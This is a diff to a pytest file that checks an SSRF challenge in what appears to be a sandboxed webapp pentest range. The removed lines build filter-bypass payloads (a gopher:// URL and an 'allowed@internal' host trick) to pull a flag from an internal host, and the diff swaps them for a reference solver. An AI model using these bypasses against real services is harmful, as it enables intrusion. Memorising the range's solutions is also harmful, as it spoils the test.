@@ -14,6 +14,7 @@ from pathlib import Path
 
 import pytest
 from cyber_webapp import NetworkedContainerWebappRuntime, WebappPack, _is_networked
+from cyber_webapp.reference_solver import solve_chain
 from graphschema import Node, WorldGraph
 from openrange_pack_sdk import Backing, Snapshot
 
@@ -47,41 +48,9 @@ def _public_service(graph: WorldGraph) -> Node:
     )
 
 
-def _company_exploit(graph: WorldGraph) -> tuple[str, str, str]:
-    # The public SSRF payload, built from the sampled filter the way an agent would —
-    # the same payload drives PROCESS and CONTAINER.
-    ssrf = next(
-        n for n in graph.by_kind("vulnerability") if n.attrs.get("kind") == "ssrf"
-    )
-    params = dict(ssrf.attrs.get("params", {}))
-    public_eps = {
-        e.dst
-        for svc in graph.by_kind("service")
-        if svc.attrs.get("exposure") == "public"
-        for e in graph.out_edges(svc.id, "exposes")
-    }
-    ep_id = next(
-        iter({e.dst for e in graph.out_edges(ssrf.id, "affects")} & public_eps)
-    )
-    path = str(graph.nodes[ep_id].attrs.get("path", "/"))
-    param = str(params["target_param"])
-    host = str(params["internal_host"])
-    internal_path = str(params["internal_path"])
-    if params.get("ssrf_filter") == "scheme_block":
-        payload = f"gopher://{host}{internal_path}"
-    else:  # host_allowlist (decimal_ip is swapped to it for a hostname target)
-        payload = f"http://{params.get('allowed_host', 'ok')}@{host}{internal_path}"
-    return path, param, payload
-
-
-def _get(
-    base_url: str, path: str, query: dict[str, str] | None = None
-) -> tuple[int, str]:
-    url = f"{base_url}{path}"
-    if query:
-        url += "?" + urllib.parse.urlencode(query)
+def _get(base_url: str, path: str) -> tuple[int, str]:
     try:
-        with urllib.request.urlopen(url, timeout=15) as resp:
+        with urllib.request.urlopen(f"{base_url}{path}", timeout=15) as resp:
             return resp.status, resp.read().decode()
     except urllib.error.HTTPError as exc:
         return exc.code, exc.read().decode()
@@ -143,7 +112,6 @@ def test_company_solves_on_process(tmp_path: Path) -> None:
     flag_host = str(ssrf.attrs["params"]["internal_host"])
     recon = next(n for n in graph.by_kind("endpoint") if n.id.endswith("_recon"))
     recon_url = str(recon.attrs["public_url"])
-    path, param, payload = _company_exploit(graph)
 
     pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
     svc = EpisodeService(WebappPack(), tmp_path)
@@ -158,12 +126,10 @@ def test_company_solves_on_process(tmp_path: Path) -> None:
         assert flag_host in recon_body
         assert flag not in recon_body
 
-        # A benign internal fetch leaks nothing; the SSRF pivot to the flag host does.
-        _, benign = _get(base, path, {param: "gopher://example.com/"})
-        assert flag not in benign
-        status, exploit = _get(base, path, {param: payload})
-        assert status == 200, exploit
-        assert flag in exploit
+        # The reference solver pivots to the flag host; benign probes leak nothing.
+        trace = solve_chain(graph, lambda p: _get(base, p)[1])
+        assert flag in trace.terminal
+        assert all(flag not in probe for probe in trace.probes)
     finally:
         svc.close()
 
@@ -241,7 +207,6 @@ def test_company_solves_across_real_containers() -> None:
     snap = _admit(_COMPANY_MANIFEST)
     graph = snap.graph
     flag = str(graph.nodes["secret_flag"].attrs["value_ref"])
-    path, param, payload = _company_exploit(graph)
 
     recon = next(n for n in graph.by_kind("endpoint") if n.id.endswith("_recon"))
     internal_names = {
@@ -263,11 +228,10 @@ def test_company_solves_across_real_containers() -> None:
         assert set(json.loads(recon_body)["upstreams"]) == internal_names
         assert flag not in recon_body
 
-        _, benign = _get(base, path, {param: "gopher://example.com/"})
-        assert flag not in benign
-        status, exploit = _get(base, path, {param: payload})
-        assert status == 200, exploit
-        assert flag in exploit  # recovered across the container boundary
+        # Same reference solver, real containers: the flag crosses only via the pivot.
+        trace = solve_chain(graph, lambda p: _get(base, p)[1])
+        assert flag in trace.terminal
+        assert all(flag not in probe for probe in trace.probes)
         final = runtime.collect()
         assert "secret_flag" in final["leaked_secret_ids"]
     finally:
